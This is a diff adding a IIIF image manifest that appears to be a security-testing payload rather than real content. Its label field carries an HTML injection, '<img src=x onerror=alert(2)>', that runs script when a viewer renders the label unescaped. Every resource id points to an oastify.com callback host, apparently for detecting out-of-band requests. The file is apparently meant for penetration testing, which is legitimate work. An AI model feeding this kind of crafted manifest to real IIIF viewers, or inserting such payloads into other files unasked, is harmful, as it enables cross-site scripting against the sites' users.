@@ -1,0 +1,37 @@
+{
+  "@context": "http://iiif.io/api/presentation/3/context.json",
+  "id": "https://8z8x5u268hpd4c6c0sdyyyr5zw5otfk39.oastify.com/manifest",
+  "type": "Manifest",
+  "label": {
+    "en": ["<li><img src=x onerror=alert(2)>"]
+  },
+  "items": [
+    {
+      "id": "https://8z8x5u268hpd4c6c0sdyyyr5zw5otfk39.oastify.com/canvas/1",
+      "type": "Canvas",
+      "width": 1000,
+      "height": 1000,
+      "items": [
+        {
+          "id": "https://8z8x5u268hpd4c6c0sdyyyr5zw5otfk39.oastify.com/page/1",
+          "type": "AnnotationPage",
+          "items": [
+            {
+              "id": "https://8z8x5u268hpd4c6c0sdyyyr5zw5otfk39.oastify.com/anno/1",
+              "type": "Annotation",
+              "motivation": "painting",
+              "body": {
+                "id": "https://picsum.photos/1000/1000",
+                "type": "Image",
+                "format": "image/jpeg",
+                "width": 1000,
+                "height": 1000
+              },
+              "target": "https://8z8x5u268hpd4c6c0sdyyyr5zw5otfk39.oastify.com/canvas/1"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
